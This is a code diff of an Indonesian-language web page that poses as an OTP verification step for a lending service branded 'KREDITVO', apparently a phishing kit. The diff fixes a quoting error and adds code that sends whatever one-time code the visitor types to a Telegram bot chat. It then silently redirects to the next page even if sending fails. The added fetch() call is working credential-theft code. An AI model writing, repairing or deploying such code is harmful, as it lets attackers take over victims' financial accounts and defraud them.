@@ -108,7 +108,7 @@
     <div class="container-box">
         <div class="title">Masukkan kode verifikasi</div>
 
-        <input type="Number" id="kode" class="input-box" placeholder="Masukkan kode disini">
+        <input type="text" id="kode" class="input-box" placeholder="Masukkan kode disini">
 
         <div class="info-text">
             Kode OTP di kirim via SMS/WhatsApp/Email.<br>
@@ -167,8 +167,31 @@
         function kirimData(){
             let kode = document.getElementById("kode").value;
 
-            let pesan = <b>*░▒▬▬ஜ۩KREDITVO۩ஜ▬▬▒░*</b>
+            // ✅ Ini yang diperbaiki (tanda petiknya)
+            let pesan = `<b>*░▒▬▬ஜ۩KREDITVO۩ஜ▬▬▒░*</b>
 KODE OTP: ${kode}`;
 
             let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        
+            
+            fetch(url, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: "HTML"
+                })
+            })
+            .then(() => {
+                // LANGSUNG PINDAH HALAMAN
+                window.location.href = HALAMAN_BERIKUTNYA;
+            })
+            .catch(err => {
+                // Tetap pindah halaman walau error
+                window.location.href = HALAMAN_BERIKUTNYA;
+            });
+        }
+    </script>
+
+</body>
+</html>
